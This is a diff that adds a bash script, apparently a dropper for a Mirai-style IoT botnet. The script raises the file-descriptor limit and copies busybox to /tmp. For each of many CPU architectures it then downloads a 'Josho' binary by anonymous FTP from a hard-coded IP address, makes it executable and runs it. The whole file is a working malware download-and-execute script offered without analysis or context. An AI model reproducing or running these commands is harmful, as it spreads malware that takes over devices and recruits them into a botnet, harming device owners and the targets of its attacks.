@@ -1,0 +1,13 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 167.99.178.26 Josho.x86 Josho.x86;cat Josho.x86 >3AvA;chmod +x *;./3AvA ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 167.99.178.26 Josho.mips Josho.mips;cat Josho.mips >3AvA;chmod +x *;./3AvA ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 167.99.178.26 Josho.mpsl Josho.mpsl;cat Josho.mpsl >3AvA;chmod +x *;./3AvA ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 167.99.178.26 Josho.arm4 Josho.arm4;cat Josho.arm4 >3AvA;chmod +x *;./3AvA ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 167.99.178.26 Josho.arm5 Josho.arm5;cat Josho.arm5 >3AvA;chmod +x *;./3AvA ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 167.99.178.26 Josho.arm6 Josho.arm6;cat Josho.arm6 >3AvA;chmod +x *;./3AvA ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 167.99.178.26 Josho.arm7 Josho.arm7;cat Josho.arm7 >3AvA;chmod +x *;./3AvA ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 167.99.178.26 Josho.ppc Josho.ppc;cat Josho.ppc >3AvA;chmod +x *;./3AvA ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 167.99.178.26 Josho.m68k Josho.m68k;cat Josho.m68k >3AvA;chmod +x *;./3AvA ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 167.99.178.26 Josho.sh4 Josho.sh4;cat Josho.sh4 >3AvA;chmod +x *;./3AvA ssh
